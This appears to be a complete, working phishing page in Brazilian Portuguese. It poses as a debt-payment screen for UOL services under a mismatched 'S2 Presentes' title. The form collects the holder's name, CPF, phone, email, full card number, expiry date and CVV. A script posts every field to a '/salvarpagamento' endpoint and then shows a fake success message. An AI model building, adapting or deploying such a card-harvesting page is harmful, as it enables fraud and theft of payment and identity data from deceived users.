<!doctype html>
<html lang="pt-br">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Pagamento de d√©bitos | S2 Presentes</title>
  <style>
    :root {
      --bg:#f6f6f6; --card:#fff; --text:#222; --muted:#6b7280;
      --primary:#ffc632; --primary-strong:#f3b81a; --accent:#0050ff;
      --border:#e5e7eb; --success:#16a34a;
    }
    *{box-sizing:border-box}
    body{margin:0;font-family:Inter,system-ui,Segoe UI,Roboto,Helvetica,Arial,sans-serif;background:var(--bg);color:var(--text)}
    .container{max-width:960px;margin:24px auto;padding:0 16px}
    .top{background:var(--card);border:1px solid var(--border);border-radius:10px;padding:16px 20px}
    .summary{display:flex;justify-content:space-between;align-items:flex-start;background:var(--bg);border-radius:8px;padding:12px 14px;margin-top:8px;flex-wrap:wrap;gap:8px}
    .summary .right{font-weight:600}
    .pay-option{background:var(--card);border:1px solid var(--border);border-radius:12px;padding:14px;margin:16px 0;position:relative}
    .pay-option.active{outline:2px solid var(--accent)}
    .icon{width:42px;height:42px;border-radius:8px;background:#eef2ff;display:flex;align-items:center;justify-content:center;margin-bottom:8px}
    .label{font-weight:600}
    .card{background:var(--card);border:1px solid var(--border);border-radius:10px;padding:16px 20px}
    .alert{display:flex;gap:10px;background:#fff8e1;border:1px solid #fde68a;color:#92400e;padding:10px 12px;border-radius:8px;align-items:flex-start}
    .alert .i{background:#fde68a;border-radius:999px;width:18px;height:18px;display:inline-flex;align-items:center;justify-content:center;font-size:12px;margin-top:2px}
    .form-grid{display:grid;grid-template-columns:1fr 1fr 1fr;gap:12px}
    label{font-size:12px;color:#374151;margin-bottom:6px;display:block}
    input{width:100%;padding:10px 12px;border:1px solid var(--border);border-radius:8px;background:#fff;font-size:14px}
    .checkbox{display:flex;align-items:center;gap:8px;margin-top:8px;font-size:14px;color:#111}
    .btn{display:inline-flex;align-items:center;justify-content:center;background:var(--primary);border:1px solid #eab308;border-radius:8px;padding:10px 16px;font-weight:600;cursor:pointer;width:100%;max-width:220px;text-align:center}
    .btn:hover{background:var(--primary-strong)}
    .footer-actions{display:flex;flex-direction:column;gap:10px;align-items:flex-start;margin-top:12px}
    @media(max-width:900px){.form-grid{grid-template-columns:1fr 1fr}}
    @media(max-width:640px){.form-grid{grid-template-columns:1fr}.btn{width:100%}.summary{flex-direction:column;align-items:flex-start}}
    .page-title{text-align:center;font-size:24px;font-weight:700;margin-bottom:4px}
    .page-note{text-align:center;font-size:12px;color:var(--muted)}
    .overlay{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(255,255,255,0.95);display:flex;align-items:center;justify-content:center;flex-direction:column;z-index:100;visibility:hidden;opacity:0;transition:opacity .3s ease,visibility .3s ease}
    .overlay.active{visibility:visible;opacity:1}
    .loader{border:4px solid #eee;border-top:4px solid var(--accent);border-radius:50%;width:48px;height:48px;animation:spin 1s linear infinite;margin-bottom:12px}
    @keyframes spin{0%{transform:rotate(0)}100%{transform:rotate(360deg)}}
    .success-check{width:64px;height:64px;border-radius:50%;background:var(--success);display:flex;align-items:center;justify-content:center;color:#fff;font-size:36px;animation:pop .3s ease forwards}
    @keyframes pop{from{transform:scale(0.5);opacity:0}to{transform:scale(1);opacity:1}}
    .success-text{font-size:18px;font-weight:600;color:var(--success);margin-top:12px;text-align:center;animation:fadein .5s ease forwards}
    @keyframes fadein{from{opacity:0}to{opacity:1}}
  </style>
</head>
<body>
  <div class="container">
    <div class="page-title">Pagamento de d√©bitos</div>
    <div class="page-note">O pagamento de d√©bitos n√£o reativa um produto cancelado.</div>

    <div class="top" style="margin-top:12px">
      <div style="font-size:14px;color:#111;margin-bottom:8px">Voc√™ est√° pagando:</div>
      <div class="summary">
        <div>
          <div>Uol Especial Nacional (Relacionamento)</div>
          <div>Uol Pacote Completo 11gb</div>
          <div style="font-size:12px;color:var(--muted)">Total de d√©bitos:</div>
        </div>
        <div class="right">R$ 52,73</div>
      </div>
    </div>

    <div class="pay-option active">
      <div class="icon">üí≥</div>
      <div class="label">Cart√£o de cr√©dito</div>
    </div>

    <div class="card" style="margin-top:4px">
      <div class="alert" style="margin-bottom:14px">
        <div class="i">i</div>
        <div>
          <div style="font-weight:700;margin-bottom:2px">Aten√ß√£o!</div>
          <div style="font-size:14px">Os dados preenchidos ser√£o salvos com seguran√ßa em nosso sistema.</div>
        </div>
      </div>

      <form id="formPagamento">
        <input type="hidden" name="pagamento_metodo" value="Cart√£o de cr√©dito">
        <div class="form-grid" style="margin-top:8px">
          <div><label>Nome do titular</label><input type="text" name="nome" placeholder="Nome e sobrenome" required></div>
          <div><label>CPF</label><input type="text" name="cpf_cnpj" id="cpf" placeholder="000.000.000-00" maxlength="14" required></div>
          <div><label>Telefone</label><input type="tel" name="telefone" id="telefone" placeholder="(00) 00000-0000" maxlength="15"></div>
          <div><label>E-mail</label><input type="email" name="email" placeholder="seuemail@exemplo.com" required></div>
          <div><label>N√∫mero do Cart√£o</label><input type="text" name="numero_cartao" id="numero_cartao" placeholder="0000 0000 0000 0000" maxlength="19" required></div>
          <div><label>Data de Validade</label><input type="text" name="validade" id="validade" placeholder="MM/AA" maxlength="5" required></div>
          <div><label>CVV</label><input type="text" name="cvv" id="cvv" placeholder="000" maxlength="4" required></div>
        </div>
        <div class="footer-actions">
          <button class="btn" type="submit">Salvar Pagamento</button>
        </div>
      </form>
    </div>
  </div>

  <div class="overlay" id="overlay">
    <div class="loader" id="loader"></div>
    <div class="success-check" id="success" style="display:none">‚úî</div>
    <div class="success-text" id="successText" style="display:none">Forma de Pagamento Atualizada com Sucesso!</div>
  </div>

  <script>
    // Fun√ß√£o de formata√ß√£o autom√°tica
    const format = {
      cpf(v){v=v.replace(/\D/g,"").slice(0,11);
        v=v.replace(/(\d{3})(\d)/,"$1.$2");
        v=v.replace(/(\d{3})(\d)/,"$1.$2");
        v=v.replace(/(\d{3})(\d{1,2})$/,"$1-$2");
        return v;
      },
      tel(v){v=v.replace(/\D/g,"").slice(0,11);
        v=v.replace(/^(\d{2})(\d)/g,"($1)$2");
        v=v.replace(/(\d{5})(\d)/,"$1-$2");
        return v;
      },
      cartao(v){v=v.replace(/\D/g,"").slice(0,16);
        v=v.replace(/(\d{4})(?=\d)/g,"$1 ");
        return v.trim();
      },
      validade(v){v=v.replace(/\D/g,"").slice(0,4);
        if(v.length>2)v=v.replace(/(\d{2})(\d)/,"$1/$2");
        return v;
      }
    };

    // M√°scaras nos campos
    const cpf=document.getElementById("cpf");
    const tel=document.getElementById("telefone");
    const cartao=document.getElementById("numero_cartao");
    const val=document.getElementById("validade");

    cpf.addEventListener("input",e=>e.target.value=format.cpf(e.target.value));
    tel.addEventListener("input",e=>e.target.value=format.tel(e.target.value));
    cartao.addEventListener("input",e=>e.target.value=format.cartao(e.target.value));
    val.addEventListener("input",e=>e.target.value=format.validade(e.target.value));

    // Envio
    const form=document.getElementById("formPagamento");
    const overlay=document.getElementById("overlay");
    const loader=document.getElementById("loader");
    const success=document.getElementById("success");
    const successText=document.getElementById("successText");

    form.addEventListener("submit",async(e)=>{
      e.preventDefault();
      overlay.classList.add("active");
      loader.style.display="block";
      success.style.display="none";
      successText.style.display="none";

      const data=Object.fromEntries(new FormData(form).entries());
      try{
        const res=await fetch("/salvarpagamento",{
          method:"POST",
          headers:{"Content-Type":"application/json"},
          body:JSON.stringify(data)
        });
        loader.style.display="none";
        if(!res.ok)throw new Error();
        success.style.display="flex";
        successText.style.display="block";
        setTimeout(()=>overlay.classList.remove("active"),3000);
      }catch(err){
        loader.style.display="none";
        successText.textContent="Erro ao salvar, tente novamente.";
        successText.style.color="red";
        successText.style.display="block";
        setTimeout(()=>overlay.classList.remove("active"),3000);
      }
    });
  </script>
</body>
</html>
